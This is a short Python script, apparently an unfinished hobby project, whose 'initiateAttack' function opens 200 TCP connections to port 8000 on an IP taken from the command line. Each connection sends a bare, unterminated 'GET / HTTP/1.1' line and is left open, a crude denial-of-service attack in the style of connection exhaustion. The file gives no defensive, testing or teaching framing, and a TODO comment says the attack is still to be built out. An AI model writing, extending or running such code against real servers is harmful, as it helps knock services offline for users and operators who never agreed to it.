import sys
import socket

PORT = 8000
STANDARD_GET_REQUEST = "GET / HTTP/1.1"

def create_connection(ip):
    for _ in range(200):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, PORT))
        s.send(str.encode(STANDARD_GET_REQUEST))


def initiateAttack(ip):
    #TODO make the attack doggie
    create_connection(ip)

def main():
    ip = sys.argv[1]
    
    initiateAttack(ip)

if __name__ == "__main__":
    main()